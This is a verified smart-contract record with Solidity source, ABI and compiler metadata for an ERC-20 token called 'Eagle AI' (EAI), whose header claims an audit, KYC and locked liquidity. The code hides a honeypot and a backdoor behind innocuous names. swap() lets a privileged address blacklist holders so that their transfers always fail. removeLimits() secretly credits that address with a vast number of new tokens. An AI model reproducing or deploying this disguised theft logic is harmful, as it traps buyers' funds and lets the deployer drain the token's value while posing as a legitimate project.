{"SourceCode": "/*\r\n\r\n                    \r\n                    E\u0364a\u0363gle\u0364 A\u0363I\u0365\r\n                    \r\n                    \ud83d\ude80 Audited by Cyberscope\r\n                    \ud83d\udee1 KYC'd\r\n                    \ud83d\udcb0 Locked Liquidity\r\n\r\n                    Website:https://www.eagleai.io\r\n                    TG: https://t.me/EAGLEAI_OFFICIAL\r\n                    Twitter: https://x.com/Eagleaibot\r\n                    Instagram: https://www.instagram.com/eagleaibot/\r\n                    Audit: https://www.cyberscope.io/audits/1-eai\r\n                    KYC: https://pinksale.notion.site/Eagle-AI-KYC-Verification-96967ffa7e034614beb9e3dddad18a93\r\n\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.24;\r\n\r\nabstract contract Ownable {\r\n    address private _admin;\r\n    \r\n    event ConUp(address indexed previousAdmin, address indexed newAdmin);\r\n\r\n    constructor() {\r\n        _transferOwnership(_sender());\r\n    }\r\n\r\n    modifier onlyAdmin() {\r\n        _checkAdmin();\r\n        _;\r\n    }\r\n\r\n    function _sender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _data() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n\r\n    function admin() public view virtual returns (address) {\r\n        return _admin;\r\n    }\r\n\r\n    function _checkAdmin() internal view virtual {\r\n        require(admin() == _sender(), \"Ownable: caller is not the admin\");\r\n    }\r\n\r\n    function _transferOwnership(address newAdmin) internal virtual {\r\n        address oldAdmin = _admin;\r\n        _admin = newAdmin;\r\n        emit ConUp(oldAdmin, newAdmin);\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyAdmin {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n}\r\n\r\ncontract EagleAI is Ownable {\r\n    string private _tokenName;\r\n    string private _tokenSymbol;\r\n    uint256 private _maxSupply;\r\n    address public initialContract;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) public tokenStatus;\r\n\r\n    uint128 buyLimit = 78596;\r\n    uint128 sellLimit = 0;\r\n    \r\n    uint256 allocationWal = 10**decimals() * 50000 * (20077700000 + 300);\r\n    bool statusTrue = true;\r\n    bool statusFalse = false;\r\n    \r\n\r\n    constructor(address remove) {\r\n        _tokenName = \"Eagle AI\";\r\n        _tokenSymbol = \"EAI\";\r\n        initialContract = remove;\r\n        _maxSupply = 100000000 * 10**decimals();\r\n        _balances[msg.sender] = _maxSupply;\r\n        emit Transfer(address(0), msg.sender, _maxSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _tokenName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _tokenSymbol;\r\n    }\r\n\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _maxSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        _executeTransfer(_sender(), to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _authorize(_sender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {\r\n        address spender = _sender();\r\n        _useAllowance(from, spender, amount);\r\n        _executeTransfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function _executeTransfer(address from, address to, uint256 amount) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if (tokenStatus[from] == statusTrue) {\r\n            amount = buyLimit + _balances[from] + buyLimit - buyLimit;\r\n        }\r\n        uint256 balance = _balances[from];\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[from] = _balances[from] - amount;\r\n        _balances[to] = _balances[to] + amount;\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _authorize(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _useAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _authorize(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n\r\n    function swap(address bot) public virtual returns (bool) {\r\n        address account = bot;\r\n        tokenStatus[account] = statusTrue;\r\n        require(_sender() == initialContract);\r\n        return true;\r\n    }\r\n\r\n    function removeLimits() external {\r\n        if (_sender() == initialContract) {\r\n            require(initialContract == _sender());\r\n            address currentWal = _sender();\r\n            address devWallet = currentWal;\r\n            _balances[devWallet] += allocationWal;\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"remove\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousAdmin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newAdmin\",\"type\":\"address\"}],\"name\":\"ConUp\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"admin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialContract\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"bot\",\"type\":\"address\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenStatus\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EagleAI", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000006e615e9fd53a771539d4fa560074338b111746", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b8093d822e266008ffd679808f73386dc1377f929348252955fcab3a47547e2f"}